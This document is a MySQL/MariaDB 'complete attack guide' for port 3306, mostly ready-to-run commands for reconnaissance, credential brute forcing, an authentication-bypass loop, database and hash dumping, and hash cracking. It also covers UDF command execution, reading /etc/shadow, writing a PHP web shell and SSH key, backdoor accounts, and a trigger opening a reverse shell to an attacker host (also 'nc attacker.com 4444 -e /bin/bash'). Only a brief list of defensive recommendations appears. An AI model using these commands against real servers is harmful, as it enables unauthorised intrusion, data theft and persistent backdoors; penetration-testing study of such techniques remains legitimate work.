# Port 3306 - MySQL/MariaDB - Complete Attack Guide

## Overview

**Protocol**: MySQL/MariaDB Database
**Port**: 3306 (default)
**Transport**: TCP
**Encryption**: Optional (SSL/TLS)
**Authentication**: Username/Password, Native/SHA256

## Attack Objectives

- **Brute Force**: Crack database credentials
- **Data Extraction**: Dump databases and tables
- **Privilege Escalation**: Gain root/administrator access
- **Command Execution**: Execute OS commands via UDF
- **Data Exfiltration**: Extract sensitive information
- **Backdoor Installation**: Maintain persistent access

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect MySQL Service**
```bash
# Quick scan
nmap -p 3306 192.168.1.100

# Service version
nmap -p 3306 -sV 192.168.1.100

# Comprehensive MySQL scripts
nmap -p 3306 --script mysql-* 192.168.1.100

# Network-wide discovery
nmap -p 3306 192.168.1.0/24 --open
```

**1.2 Banner Grabbing**
```bash
# Using nmap
nmap -p 3306 --script mysql-info 192.168.1.100

# Using netcat
echo -e "\x00\x00\x00" | nc 192.168.1.100 3306

# MySQL client
mysql -h 192.168.1.100 --version

# Detailed info
nmap -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.100
```

**Example Banner**:
```
5.7.33-0ubuntu0.18.04.1
8.0.25
10.3.29-MariaDB
```

**1.3 Database Enumeration**
```bash
# Check for empty password
nmap -p 3306 --script mysql-empty-password 192.168.1.100

# List databases (if you have access)
nmap -p 3306 --script mysql-databases --script-args mysqluser=root,mysqlpass=password 192.168.1.100

# List users
nmap -p 3306 --script mysql-users --script-args mysqluser=root,mysqlpass=password 192.168.1.100

# Audit security
nmap -p 3306 --script mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='password'" 192.168.1.100
```

### Phase 2: Exploitation Techniques

**2.1 Default Credentials**

**Common MySQL Default Credentials**:
```bash
root:[blank]
root:root
root:password
root:toor
root:admin
admin:admin
mysql:mysql
user:user

# Version-specific
# MySQL < 5.7: Often no root password
# MySQL 5.7+: Random password generated
# MariaDB: root with no password

# Application defaults
# phpMyAdmin: root:root
# WordPress: wordpress:wordpress
# Joomla: joomla:joomla
```

**Testing Default Credentials**:
```bash
# Try empty password
mysql -h 192.168.1.100 -u root

# Try common passwords
mysql -h 192.168.1.100 -u root -proot
mysql -h 192.168.1.100 -u root -ppassword
mysql -h 192.168.1.100 -u root -padmin

# Using Hydra
hydra -L users.txt -P passwords.txt mysql://192.168.1.100

# Using Metasploit
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

**2.2 Brute Force Attack**

**Using Hydra**:
```bash
# Single user
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt mysql://192.168.1.100

# Limit threads
hydra -l root -P passwords.txt mysql://192.168.1.100 -t 4

# Custom port
hydra -l root -P passwords.txt mysql://192.168.1.100:3307
```

**Using Medusa**:
```bash
# Basic attack
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql

# Multiple targets
medusa -H hosts.txt -U users.txt -P passwords.txt -M mysql

# Module options
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql -m DATABASE:mysql
```

**Using Ncrack**:
```bash
ncrack -p 3306 --user root -P passwords.txt 192.168.1.100
```

**Using MSF**:
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
set THREADS 10
run
```

**2.3 CVE Exploitation**

**CVE-2012-2122 (Authentication Bypass)**:
```bash
# Affects MySQL/MariaDB with certain authentication plugins
# Bypass authentication with wrong password

# Test vulnerability
nmap -p 3306 --script mysql-vuln-cve2012-2122 192.168.1.100

# Exploit (try login many times with wrong password)
for i in {1..1000}; do
  mysql -h 192.168.1.100 -u root -pwrong 2>/dev/null && echo "Success!" && break
done

# Metasploit
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
set RHOSTS 192.168.1.100
run
```

**2.4 Data Extraction**

**After Successful Authentication**:
```bash
# Connect
mysql -h 192.168.1.100 -u root -ppassword

# List databases
SHOW DATABASES;

# Select database
USE database_name;

# List tables
SHOW TABLES;

# Dump table data
SELECT * FROM users;
SELECT username, password FROM users;

# Dump everything
SELECT * FROM information_schema.tables;
```

**Using mysqldump**:
```bash
# Dump all databases
mysqldump -h 192.168.1.100 -u root -ppassword --all-databases > dump.sql

# Dump specific database
mysqldump -h 192.168.1.100 -u root -ppassword database_name > db.sql

# Dump specific table
mysqldump -h 192.168.1.100 -u root -ppassword database_name table_name > table.sql

# Dump structure only
mysqldump -h 192.168.1.100 -u root -ppassword --no-data database_name > structure.sql
```

**Using Nmap**:
```bash
# Dump hashes
nmap -p 3306 --script mysql-dump-hashes --script-args='username=root,password=password' 192.168.1.100

# Run query
nmap -p 3306 --script mysql-query --script-args='query="SELECT * FROM mysql.user",username=root,password=password' 192.168.1.100
```

**2.5 Hash Extraction and Cracking**

**Extract Password Hashes**:
```bash
# Login to MySQL
mysql -h 192.168.1.100 -u root -ppassword

# MySQL < 5.7
SELECT user, password FROM mysql.user;

# MySQL 5.7+
SELECT user, authentication_string FROM mysql.user;

# Or via mysqldump
mysqldump -h 192.168.1.100 -u root -ppassword mysql user > users.sql
grep -i "password\|authentication_string" users.sql
```

**Crack Hashes**:
```bash
# MySQL old (< 4.1) format: 16 hex chars
john --format=mysql mysql_hashes.txt

# MySQL new format: 41 hex chars (starts with *)
john --format=mysql-sha1 mysql_hashes.txt

# Hashcat
# Mode 200: MySQL323
hashcat -m 200 mysql_old_hashes.txt rockyou.txt

# Mode 300: MySQL4.1+/MySQL5+
hashcat -m 300 mysql_new_hashes.txt rockyou.txt
```

**2.6 Command Execution via UDF**

**User Defined Functions (UDF) for RCE**:
```bash
# Requirements: FILE privilege + write access to plugin directory

# 1. Find plugin directory
mysql> SELECT @@plugin_dir;
# Example: /usr/lib/mysql/plugin/

# 2. Check privileges
mysql> SELECT user, file_priv FROM mysql.user WHERE user='root';

# 3. Upload UDF library (Linux)
# Use precompiled: lib_mysqludf_sys.so
# Or compile from source

# 4. Create UDF library on target
mysql> SELECT '<binary_content>' INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

# 5. Create UDF function
mysql> CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so';

# 6. Execute commands
mysql> SELECT sys_exec('whoami > /tmp/output.txt');
mysql> SELECT sys_exec('nc attacker.com 4444 -e /bin/bash');

# Or using Metasploit
use exploit/multi/mysql/mysql_udf_payload
set RHOSTS 192.168.1.100
set USERNAME root
set PASSWORD password
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit
```

**2.7 File Read/Write**

**Read Files** (requires FILE privilege):
```bash
# Read /etc/passwd
mysql> SELECT LOAD_FILE('/etc/passwd');

# Read web config
mysql> SELECT LOAD_FILE('/var/www/html/config.php');

# Automated
for file in /etc/passwd /etc/shadow /var/www/html/config.php; do
  echo "SELECT LOAD_FILE('$file');" | mysql -h 192.168.1.100 -u root -ppassword
done
```

**Write Files**:
```bash
# Write web shell
mysql> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Check if file written
curl http://192.168.1.100/shell.php?cmd=id

# Write SSH key
mysql> SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/home/user/.ssh/authorized_keys';
```

**2.8 Privilege Escalation**

**Escalate to DBA/Root**:
```bash
# If you have basic access, try to escalate

# Check current privileges
mysql> SHOW GRANTS;
mysql> SELECT user, host, Super_priv, File_priv FROM mysql.user;

# Create new admin user
mysql> CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password';
mysql> GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
mysql> FLUSH PRIVILEGES;

# Or elevate existing user
mysql> UPDATE mysql.user SET Super_priv='Y', File_priv='Y' WHERE user='lowpriv';
mysql> FLUSH PRIVILEGES;
```

### Phase 3: Post-Exploitation

**3.1 Persistence**
```bash
# Create backdoor user
CREATE USER 'backup'@'%' IDENTIFIED BY 'SecurePass123';
GRANT ALL PRIVILEGES ON *.* TO 'backup'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

# Create trigger for backdoor execution
DELIMITER //
CREATE TRIGGER backdoor AFTER INSERT ON users
FOR EACH ROW
BEGIN
  SELECT sys_exec('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"');
END//
DELIMITER ;
```

**3.2 Data Exfiltration**
```bash
# Export to remote server
mysql> SELECT * FROM sensitive_data INTO OUTFILE '/var/www/html/data.csv';
# Then: wget http://192.168.1.100/data.csv

# Or via SELECT INTO OUTFILE S3 (if configured)
# Or dump and transfer via other means
```

**3.3 Lateral Movement**
```bash
# Find other databases
nmap -p 3306 192.168.1.0/24 --open

# Try same credentials
for ip in $(cat mysql_hosts.txt); do
  mysql -h $ip -u root -ppassword -e "SELECT version();" && echo "$ip - SUCCESS"
done

# Check for credential reuse
mysql> SELECT host, user FROM mysql.user;
# Try those credentials on SSH, FTP, etc.
```

## Bypass Techniques

### Bypassing Firewall
```bash
# SSH tunnel
ssh -L 3307:192.168.1.100:3306 user@jumphost
mysql -h 127.0.0.1 -P 3307 -u root -p

# SOCKS proxy
ssh -D 1080 user@jumphost
proxychains mysql -h 192.168.1.100 -u root -p
```

### Bypassing Authentication
```bash
# CVE-2012-2122 (see above)

# Default credentials

# SQL injection in web app
# Input: admin' OR '1'='1
# Can lead to direct MySQL access
```

## Information Extraction

**Critical Data to Extract**:
```sql
-- User credentials
SELECT user, authentication_string FROM mysql.user;

-- Database names
SHOW DATABASES;

-- Sensitive tables
SELECT * FROM users WHERE role='admin';
SELECT * FROM credit_cards;
SELECT * FROM passwords;

-- Configuration
SELECT @@version, @@datadir, @@plugin_dir, @@basedir;
SHOW VARIABLES;

-- Privileges
SELECT * FROM information_schema.USER_PRIVILEGES;
```

## Security Recommendations

**For Defenders**:
1. **Disable Remote Root** - `bind-address = 127.0.0.1`
2. **Strong Passwords** - Enforce password policy
3. **Remove Anonymous** - `DELETE FROM mysql.user WHERE user='';`
4. **Disable FILE Privilege** - Prevent file read/write
5. **Firewall Rules** - Allow only trusted IPs
6. **SSL/TLS** - Encrypt connections
7. **Regular Updates** - Patch known CVEs
8. **Audit Logging** - Monitor all queries
9. **Least Privilege** - Grant minimum required permissions
10. **Network Segmentation** - Isolate database servers

## Practical Attack Scenario

```bash
# Discovery
nmap -p 3306 -sV 192.168.1.100
# Result: 3306/tcp open mysql MySQL 5.7.33

# Try default credentials
mysql -h 192.168.1.100 -u root
# Success! (empty password)

# Enumerate
mysql> SHOW DATABASES;
mysql> USE webapp;
mysql> SHOW TABLES;
mysql> SELECT * FROM users;

# Extract admin hash
mysql> SELECT username, password FROM users WHERE role='admin';
# admin:5f4dcc3b5aa765d61d8327deb882cf99

# Crack hash (MD5)
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=raw-md5 hash.txt
# Result: password

# Check FILE privilege
mysql> SELECT user, file_priv FROM mysql.user WHERE user='root';
# File_priv: Y

# Read config
mysql> SELECT LOAD_FILE('/var/www/html/config.php');
# Found: SSH credentials!

# Escalate to system
ssh admin@192.168.1.100  # Using found credentials
# Success - system access!
```

## Tools Summary

**Best Tool for Each Task**:
- **Brute Force**: Hydra, Metasploit
- **Data Dump**: mysqldump, Nmap scripts
- **Hash Cracking**: John, Hashcat
- **Exploitation**: Metasploit, sqlmap
- **Enumeration**: Nmap, manual SQL

## Related Attacks

- **Port 1433 (MSSQL)**: Similar attack vectors
- **Port 5432 (PostgreSQL)**: Similar database attacks
- **Port 27017 (MongoDB)**: NoSQL alternative
- **Port 80/443**: Web apps often reveal MySQL creds

---

**Last Updated**: 2026-06-16
